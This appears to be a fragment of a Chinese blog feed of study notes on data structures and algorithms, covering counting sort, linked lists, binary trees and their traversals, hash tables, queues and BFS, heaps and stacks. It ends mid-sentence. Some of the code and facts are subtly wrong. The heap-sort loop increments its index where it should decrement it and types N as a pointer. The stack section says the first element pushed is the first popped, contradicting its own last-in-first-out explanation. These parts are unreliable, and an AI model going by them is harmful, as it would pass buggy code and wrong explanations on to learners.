class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 计数排序（C）</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_arr</span><span class="params">(<span class="type">int</span> *arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, arr[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>, arr[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">counting_sort</span><span class="params">(<span class="type">int</span> *ini_arr, <span class="type">int</span> *sorted_arr, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="type">int</span> *count_arr = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">100</span>);</span><br><span class="line">    <span class="type">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">100</span>; k++)</span><br><span class="line">        count_arr[k] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        count_arr[ini_arr[i]]++;</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt; <span class="number">100</span>; k++)</span><br><span class="line">        count_arr[k] += count_arr[k - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (j = n; j &gt; <span class="number">0</span>; j--)</span><br><span class="line">        sorted_arr[--count_arr[ini_arr[j - <span class="number">1</span>]]] = ini_arr[j - <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">free</span>(count_arr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">int</span> *arr = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * n);</span><br><span class="line">    <span class="type">int</span> *sorted_arr = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * n);</span><br><span class="line">    srand(time(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        arr[i] = rand() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ini_array: &quot;</span>);</span><br><span class="line">    print_arr(arr, n);</span><br><span class="line">    counting_sort(arr, sorted_arr, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sorted_array: &quot;</span>);</span><br><span class="line">    print_arr(sorted_arr, n);</span><br><span class="line">    <span class="built_in">free</span>(arr);</span><br><span class="line">    <span class="built_in">free</span>(sorted_arr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记6</title>
      <link href="/2023/11/05/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-11-05-%E7%AC%94%E8%AE%B06/"/>
      <url>/2023/11/05/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-11-05-%E7%AC%94%E8%AE%B06/</url>
      
        <content type="html"><![CDATA[<h2 id="数据结构-算法基础"><a href="#数据结构-算法基础" class="headerlink" title="数据结构&amp;算法基础"></a>数据结构&amp;算法基础</h2><h3 id="数据结构与算法的由来及其意义"><a href="#数据结构与算法的由来及其意义" class="headerlink" title="数据结构与算法的由来及其意义"></a>数据结构与算法的由来及其意义</h3><p><strong>为什么要学习数据结构与算法?</strong></p><p>随着应用程序变得越来越复杂和数据越来越丰富，几百万、几十亿甚至几百亿的数据就会出现，而对这么大对数据进行搜索、插入或者排序等的操作就越来越慢，数据结构就是用来解决这些问题的。</p><h3 id="从数组到链表"><a href="#从数组到链表" class="headerlink" title="从数组到链表"></a>从数组到链表</h3><table><thead><tr><th align="center">比较项</th><th align="center">数组</th><th align="center">链表</th></tr></thead><tbody><tr><td align="center">逻辑结构</td><td align="center">（1）数组在内存中连续； (2)使用数组之前，必须事先固定数组长度，不支持动态改变数组大小；(3) 数组元素增加时，有可能会数组越界；(4) 数组元素减少时，会造成内存浪费；（5）数组增删时需要移动其它元素</td><td align="center">（1）链表采用动态内存分配的方式，在内存中不连续 (2)支持动态增加或者删除元素 (3)需要时可以使用malloc或者new来申请内存，不用时使用free或者delete来释放内存</td></tr><tr><td align="center">内存结构</td><td align="center">数组从栈上分配内存，使用方便，但是自由度小</td><td align="center">链表从堆上分配内存，自由度大，但是要注意内存泄漏</td></tr><tr><td align="center">访问效率</td><td align="center">数组在内存中顺序存储，可通过下标访问，访问效率高</td><td align="center">链表访问效率低，如果想要访问某个元素，需要从头遍历</td></tr><tr><td align="center">越界问题</td><td align="center">数组的大小是固定的，所以存在访问越界的风险</td><td align="center">只要可以申请得到链表空间，链表就无越界风险</td></tr></tbody></table><h4 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h4><p>链表是一种由一组顶点（节点）组成的数据结构，这些顶点共同表示一个序列。在最简单的形式下，每个顶点由一个数据和一个引用（链接）组成，该引用指向序列中的下一个顶点。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> a,b;</span><br><span class="line">  <span class="type">char</span> c;</span><br><span class="line">  Node *next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>链表中的元素可存储在内存的任何地方</li><li>链表的每个元素都存储了下一个元素的地址，从而使一系列随机的内存地址串在一起。</li></ul><p><img src="https://img-blog.csdnimg.cn/2d1dcb64e8d044128e5868bd99dd8528.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6aOO57un57ut5ZC5VFQ=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="1"></p><h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p><img src="https://www.runoob.com/wp-content/uploads/2020/09/data-structure.png" alt="1"></p><p>上图这些元素具有的就是 “一对多” 的逻辑关系, 观察这些元素之间的逻辑关系会发现，它们整体上很像一棵倒着的树，这也是将存储它们的结构起名为“树”（或者 “树形”）的原因。</p><p>存储具有 “一对多” 逻辑关系的数据，数据结构推荐使用树存储结构。</p><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p><img src="https://img-blog.csdnimg.cn/20210222170426652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><p>1.考虑结点K。根A到结点K的唯一路径上的任意结点,称为结点K的祖先。如结点B是结点K的祖先,而结点K是结点B的子孙。路径上最接近结点K的结点E称为K的双亲,而K为结点E的孩子。根A是树中唯一没有双亲的结点。有相同双亲的结点称为兄弟,如结点K和结点L有相同的双亲E,即K和L为兄弟。<br>2.树中一个结点的孩子个数称为该结点的度,树中结点的最大度数称为树的度。如结点B的度为2,结点D的度为3,树的度为3。<br>3.度大于0的结点称为分支结点(又称非终端结点);度为0(没有子女结点)的结点称为叶子结点(又称终端结点)。在分支结点中,每个结点的分支数就是该结点的度。<br>4.结点的深度、高度和层次:</p><ul><li><p>结点的层次从树根开始定义,根结点为第1层,它的子结点为第2层,以此类推。双亲在同一层的结点互为堂兄弟,图中结点G与E,F,H,I,J互为堂兄弟。</p></li><li><p>结点的深度是从根结点开始自顶向下逐层累加的。</p></li><li><p>结点的高度是从叶结点开始自底向上逐层累加的。</p></li><li><p>树的高度(或深度)是树中结点的最大层数。图中树的高度为4。</p></li></ul><p>5.有序树和无序树。树中结点的各子树从左到右是有次序的,不能互换,称该树为有序树,否则称为无序树。假设图为有序树,若将子结点位置互换,则变成一棵不同的树。<br>6.路径和路径长度。树中两个结点之间的路径是由这两个结点之间所经过的结点序列构成的,而路径长度是路径上所经过的边的个数。<br>注意:由于树中的分支是有向的,即从双亲指向孩子,所以树中的路径是从上向下的,同一双亲的两个孩子之间不存在路径。<br>7.森林。森林是m (m≥0)棵互不相交的树的集合。森林的概念与树的概念十分相近，因为只要把树的根结点删去就成了森林。反之，只要给m棵独立的树加上一个结点，并把这m棵树作为该结点的子树，则森林就变成了树。</p><h4 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h4><h5 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h5><p>简单地理解，满足以下两个条件的树就是二叉树：</p><ol><li><p>本身是有序树；</p></li><li><p>树中包含的各个节点的度不能超过 2，即只能是 0、1 或者 2；</p></li></ol><h5 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h5><p>经过前人的总结，二叉树具有以下几个性质：</p><ol><li>二叉树中，第 i 层最多有 2^(i-1) 个结点。</li><li>如果二叉树的深度为 K，那么此二叉树最多有 (2^K)-1 个结点。</li><li>二叉树中，终端结点数（叶子结点数）为 n0，度为 2 的结点数为 n2，则 n0&#x3D;n2+1。</li></ol><p>二叉树还可以继续分类，衍生出满二叉树和完全二叉树。</p><h4 id="满二叉树"><a href="#满二叉树" class="headerlink" title="满二叉树"></a>满二叉树</h4><p><img src="https://img-blog.csdnimg.cn/20210223141540595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><p>如果二叉树中除了叶子结点，每个结点的度都为 2，则此二叉树称为<em><strong>满二叉树</strong></em>。<br>满二叉树除了满足普通二叉树的性质，还具有以下性质：</p><ol><li>满二叉树中第 i 层的节点数为 2^(i-1) 个。</li><li>深度为 k 的满二叉树必有 (2^k)-1 个节点 ，叶子数为 2^(k-1)。</li><li>满二叉树中不存在度为 1 的节点，每一个分支点中都两棵深度相同的子树，且叶子节点都在最底层。<br>4 具有 n 个节点的满二叉树的深度为 log2(n+1)。</li></ol><h4 id="完全二叉树"><a href="#完全二叉树" class="headerlink" title="完全二叉树"></a>完全二叉树</h4><p><img src="https://img-blog.csdnimg.cn/20210223141920389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><p>如果二叉树中<strong>除去最后一层节点为满二叉树，且最后一层的结点依次从左到右分布</strong>，则此二叉树被称为<em><strong>完全二叉树</strong></em>。<br>如图a所示是一棵完全二叉树，图b由于最后一层的节点没有按照从左向右分布，因此只能算作是普通的二叉树。<br>完全二叉树除了具有普通二叉树的性质，它自身也具有一些独特的性质，比如说，n 个结点的完全二叉树的深度为 log2n+1。</p><p>对于任意一个完全二叉树来说，如果将含有的结点按照层次从左到右依次标号（如图a)，对于任意一个结点 i ，完全二叉树还有以下几个结论成立：</p><ol><li>当 i&gt;1 时，父亲结点为结点 [i&#x2F;2] 。（i&#x3D;1 时，表示的是根结点，无父亲结点）</li><li>如果 2<em>i&gt;n（总结点的个数） ，则结点 i 肯定没有左孩子（为叶子结点）；否则其左孩子是结点 2</em>i 。</li><li>如果 2<em>i+1&gt;n ，则结点 i 肯定没有右孩子；否则右孩子是结点 2</em>i+1 。</li></ol><h4 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h4><p>分为先序遍历，中序遍历，后序遍历</p><p>二叉树的遍历( traversing binary tree )是指从根结点出发，按照某种次序依次访问二叉树中所有结点，使得每个结点被访问一次且仅被访问一次。</p><h5 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h5><p><img src="https://img-blog.csdnimg.cn/20210223151636759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><p>先序遍历(PreOrder) 的操作过程如下：<br>若二叉树为空，则什么也不做，否则，</p><ol><li>访问根结点;</li><li>先序遍历左子树;</li><li>先序遍历右子树。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line">  visit(T); <span class="comment">//访问根节点</span></span><br><span class="line">  PreOrder(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">  PreOrder(T-&gt;rchild); <span class="comment">//递归遍历右子树</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h5><p><img src="https://img-blog.csdnimg.cn/2021022315230487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><p>中序遍历( InOrder)的操作过程如下：<br>若二叉树为空，则什么也不做，否则，</p><ol><li>中序遍历左子树;</li><li>访问根结点;</li><li>中序遍历右子树。</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BiTree T)</span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(T != <span class="literal">NULL</span>)&#123;</span><br><span class="line">  InOrder(T-&gt;lchild); <span class="comment">//递归遍历左子树</span></span><br><span class="line">  visit(T); <span class="comment">//访问根结点</span></span><br><span class="line">  InOrder(T-&gt;rchild); <span class="comment">//递归遍历右子树</span></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h5><p><img src="https://img-blog.csdnimg.cn/20210223152835126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlYWxfRm9vbF8=,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><p>后序遍历(PostOrder) 的操作过程如下：<br>若二叉树为空，则什么也不做，否则，</p><ol><li>后序遍历左子树;</li><li>后序遍历右子树;</li><li>访问根结点。</li></ol><h5 id="哈希表，Hash"><a href="#哈希表，Hash" class="headerlink" title="哈希表，Hash"></a>哈希表，Hash</h5><p>哈希表，也可以称为散列表或者 Hash 表，拥有数组支持按照下标随机访问数据的特性，所以哈希表其实就是数组的一种扩展，由数组演化而来。可以说，如果没有数组，就没有散列表。</p><p>哈希表存储的是由键（key）和值（value）组成的数据，通过散列函数将键key映射到对应的value上，其存储方式称之为散列技术。<br>散列技术是指在记录的存储位置和它的关键字之间建立一个确定的对应关系f，使每一个关键字都对应一个存储位置。即：存储位置&#x3D;f（关键字）。这样，在查找的过程中，只需要通过这个对应关系f 找到给定值key的映射f（key）。只要集合中存在关键字和key相等的记录，则必在存储位置f（key）处。我们把这种对应关系f 称为散列函数或哈希函数。</p><h3 id="队列-应用"><a href="#队列-应用" class="headerlink" title="队列&amp;应用"></a>队列&amp;应用</h3><p>和链表相比，队列的特殊性体现在以下两个方面：</p><ol><li>元素只能从队列的一端进入，从另一端出去</li><li>队列中各个元素的进出必须遵循“先进先出”的原则，即最先入队的元素必须最先出队。</li></ol><p>通常，我们将元素进入队列的一端称为“队尾”，进入队列的过程称为“入队”；将元素从队列中出去的一端称为“队头”，出队列的过程称为“出队”。</p><h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><p>队列在操作系统中应用的十分广泛，比如用它解决 CPU 资源的竞争问题。</p><p>对于一台计算机来说，CPU 通常只有 1 个，是非常重要的资源。如果在很短的时间内，有多个程序向操作系统申请使用 CPU，就会出现竞争 CPU 资源的现象。不同的操作系统，解决这一问题的方法是不一样的，有一种方法就用到了队列这种存储结构。</p><p>假设在某段时间里，有 A、B、C 三个程序向操作系统申请 CPU 资源，操作系统会根据它们的申请次序，将它们排成一个队列。根据“先进先出”原则，最先进队列的程序出队列，并获得 CPU 的使用权。待该程序执行完或者使用 CPU 一段时间后，操作系统会将 CPU 资源分配给下一个出队的程序，以此类推。如果该程序在获得 CPU 资源的时间段内没有执行完，则只能重新入队，等待操作系统再次将 CPU 资源分配给它。</p><h4 id="队列的相关操作"><a href="#队列的相关操作" class="headerlink" title="队列的相关操作"></a>队列的相关操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">queue</span>&lt;type&gt; q; <span class="comment">//定义队列，type为数据类型，例如int，float，char等</span></span><br><span class="line">q.empty();  <span class="comment">//判断队列是否为空</span></span><br><span class="line">q.size();   <span class="comment">//返回队列长度</span></span><br><span class="line">q.push(item);   <span class="comment">//对于queue，在队尾压入一个新元素</span></span><br><span class="line">q.pop();   <span class="comment">//对于queue，删除队首元素</span></span><br><span class="line">q.front();  <span class="comment">//返回队首元素的值，但不删除该元素</span></span><br><span class="line">q.back();   <span class="comment">//返回队尾元素的值，但不删除该元素</span></span><br></pre></td></tr></table></figure><h4 id="广度优先搜索-Breadth-First-Search-BFS"><a href="#广度优先搜索-Breadth-First-Search-BFS" class="headerlink" title="广度优先搜索(Breadth-First Search,BFS)"></a>广度优先搜索(Breadth-First Search,BFS)</h4><p>广度优先搜索（BFS,或称为宽度优先搜索）是基本的暴力技术，常用于解决图，树的遍历问题<br>在具体编程时，一般用队列这种数据结构来具体实现BFS，甚至可以说“BFS&#x3D;队列”</p><p><strong>BFS 为什么需要队列？</strong><br>对于 BFS 算法，正如上面所说的，我们需要一层一层遍历所有的相邻结点。那么相邻结点之间的先后顺序如何确定？因此我们需要一个数据结构来进行存储和操作，需要使得先遍历的结点先被存储，直到当前层都被存储后，按照先后顺序，先被存储的结点也会被先取出来，继续遍历它的相邻结点。<br>因此我们可以发现，First In First Out (FIFO) 完全契合这里的使用情况。因此对于 BFS 我们需要使用 Queue 这样的一个数据结构，来存储每一层的结点，同时维护『先进先出 FIFO』的顺序。</p><p><strong>BFS 算法过程</strong><br>BFS 的实现过程也非常直接，主要由 3 部分组成：</p><ul><li>起始：将起点（源点，树的根节点）放入队列中</li><li>扩散：从队列中取出队头的结点，将它的相邻结点放入队列，不断重复这一步</li><li>终止：当队列为空时，说明我们遍历了所有的结点，整个图都被搜索了一遍</li></ul><h4 id="优先队列（priority-quque）"><a href="#优先队列（priority-quque）" class="headerlink" title="优先队列（priority_quque）"></a>优先队列（priority_quque）</h4><p>优先队列也是一种队列，只不过不同的是，优先队列的出队顺序是按照优先级来的；在有些情况下，可能需要找到元素集合中的最小或者最大元素，可以利用优先队列来完成操作.</p><p>优先队列和队列的区别在于，对于优先队列，元素进入队列的顺序可能与其被操作的顺序不同，作业调度是优先队列的一个应用实例，它根据优先级的高低而不是先到先服务的方式来进行调度。</p><h4 id="堆（Heap）"><a href="#堆（Heap）" class="headerlink" title="堆（Heap）"></a>堆（Heap）</h4><p>堆的概念：<br>数据结构二叉堆能够很好地实现优先队列的基本操作。在二叉堆的数组中，每个元素都要保证<br>大于等于另两个特定位置的元素。相应地，这些位置的元素又至少要大于等于数组中的另两个元素，<br>以此类推。如果我们将所有元素画成一棵二叉树，将每个较大元素和两个较小的元素用边连接就可以很容易看出这种结构。</p><p>定义:<br>当一棵二叉树的每个结点都大于等于它的两个子结点时，它被称为堆有序。<br>相应地，在堆有序的二叉树中，每个结点都小于等于它的父结点（如果有的话）。从任意结点向上，我们都能得到一列非递减的元素；从任意结点向下，我们都能得到一列非递增的元素</p><p>（简单起见，在下文中我们将二叉堆简称为堆）<br>在一个堆中，位置 k 的结点的父结点的位置为 k&#x2F;2 ，而它的两个子结点的位置则分别为 2k 和 2k+1。这样在不使用指针的情况下我们也可以通过计算数组的索引在树中上下移动：从 a[k] 向上一层<br>就令 k 等于 k&#x2F;2，向下一层则令 k 等于 2k 或 2k+1。<br>用数组（堆）实现的完全二叉树的结构是很严格的，但它的灵活性已经足以让我们高效地实现优<br>先队列。</p><h5 id="堆的算法"><a href="#堆的算法" class="headerlink" title="堆的算法"></a>堆的算法</h5><p>我们用长度为 N+1 的数组 a[] 来表示一个大小为 N 的堆，我们不会使用 a[0]， 堆 元 素 放 在 a[1] 至<br>a[N] 中。在排序算法中，我们只通过辅助函数 less() 和 exch() 来访问元素，堆的操作会首先进行一些简单的改动，打破堆的状态，然后再遍历堆并按照要求将堆的状态恢复。我们称这个过程叫做堆的有序化（reheapifying）。</p><p>堆实现的比较和交换方法如下方的代码所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">less</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a[i] &lt; a[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">exch</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> t = a[i];</span><br><span class="line">  a[i] = a[j];</span><br><span class="line">  a[j] = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="由下至上的堆有序化（上浮）"><a href="#由下至上的堆有序化（上浮）" class="headerlink" title="由下至上的堆有序化（上浮）"></a>由下至上的堆有序化（上浮）</h5><p>如果堆的有序状态因为某个结点变得比它的父结点更大而被打破，那么我们就需要通过交换它和它的父结点来修复堆。交换后，这个结点比它的两个子结点都大（一个是曾经的父结点，另一个比它更小，因为它是曾经父结点的子结点），但这个结点仍然可能比它现在的父结点更大。我们可以一遍遍地用同样的办法恢复秩序，将这个结点不断向上移动直到我们遇到了一个更大的父结点。只要记住位置 k 的结点的父结点的位置是 k&#x2F;2，这个过程实现起来很简单。swim() 方法中的循环可以保证只有位置 k 上的结点大于它的父结点时堆的有序状态才会被打破。因此只要该结点不再大于它的父结点，堆的有序状态就恢复了。至于方法名，当一个结点太大的时候它需要浮（swim）到堆的更高层。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">swim</span><span class="params">(<span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span>(k &gt; <span class="number">1</span> &amp;&amp; less(k/<span class="number">2</span>, k))</span><br><span class="line">  &#123;</span><br><span class="line">    exch(k/<span class="number">2</span>, k);</span><br><span class="line">    k = k/<span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="由上至下的堆有序化（下沉）"><a href="#由上至下的堆有序化（下沉）" class="headerlink" title="由上至下的堆有序化（下沉）"></a>由上至下的堆有序化（下沉）</h5><p>如果堆的有序状态因为某个结点变得比它的两个子结点或是其中之一更小了而被打破了，那么我们可以通过将它和它的两个子结点中的较大者交换来恢复堆。交换可能会在子结点处继续打破堆的有序状态，因此我们需要不断地用相同的方式将其修复，将结点向下移动直到它的子结点都比它更小或是到达了堆的底部。由位置为 k 的结点的子结点位于 2k 和 2k+1 可以直接得到对应的代码。<br>至于方法名，由上至下的堆有序化的实现代码见下方的代码框。当一个结点太小的时候它需要沉（sink）到堆的更低层。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sink</span><span class="params">(<span class="type">int</span> k)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">2</span>*k &lt;= N)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">2</span>*k;</span><br><span class="line">    <span class="keyword">if</span>(j &lt; N &amp;&amp; less(j, j+<span class="number">1</span>)) j++;</span><br><span class="line">    <span class="keyword">if</span>(!less(k,j)) <span class="keyword">break</span>;</span><br><span class="line">    exch(k, j);</span><br><span class="line">    k = j;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h5><p>这段代码用 sink() 方法将 a[1] 到a[N] 的元素排序（sink() 被修改过，以a[] 和 N 作为参数）。for 循环构造了堆，然后 while 循环将最大的元素 a[1] 和a[N] 交换并修复了堆，如此重复直到堆变空。将 exch() 和 less() 的实现中的索引减一即可得到和其他排序算法一致的实现（将 a[0] 至 a[N-1] 排序）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Heap_sort</span><span class="params">(<span class="type">int</span> *a,<span class="type">int</span> *N)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> k = N/<span class="number">2</span>; k &gt;= <span class="number">1</span>; k++) sink(a, k, N);</span><br><span class="line">  <span class="keyword">while</span>(N &gt; <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    exch(a, <span class="number">1</span>, N--);</span><br><span class="line">    sink(a, <span class="number">1</span>, N);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="栈-应用"><a href="#栈-应用" class="headerlink" title="栈&amp;应用"></a>栈&amp;应用</h3><p>对于逻辑关系为“一对一”的数据，除了用顺序表和链表存储外，还可以用栈结构存储。</p><p>栈是一种“特殊”的线性存储结构，它的特殊之处体现在以下两个地方：<br>1、元素进栈和出栈的操作只能从一端完成，另一端是封闭的，如下图所示：</p><p><img src="http://data.biancheng.net/uploads/allimg/220721/1923193331-0.gif" alt="1"></p><p>通常，我们将元素进栈的过程简称为“入栈”、“进栈”或者“压栈”；将元素出栈的过程简称为“出栈”或者“弹栈”。</p><p>2、栈中无论存数据还是取数据，都必须遵循“先进后出”的原则，即最先入栈的元素最先出栈。以图 1 的栈为例，很容易可以看出是元素 1 最先入栈，然后依次是元素 2、3、4 入栈。在此基础上，如果想取出元素 1，根据“先进后出”的原则，必须先依次将元素 4、3、2 出栈，最后才能轮到元素 1 出栈。</p><p>我们习惯将栈的开口端称为栈顶，封口端称为栈底。例如在图 1 中，元素 4 一侧为栈顶，元素 1 一侧为栈底，如图 2 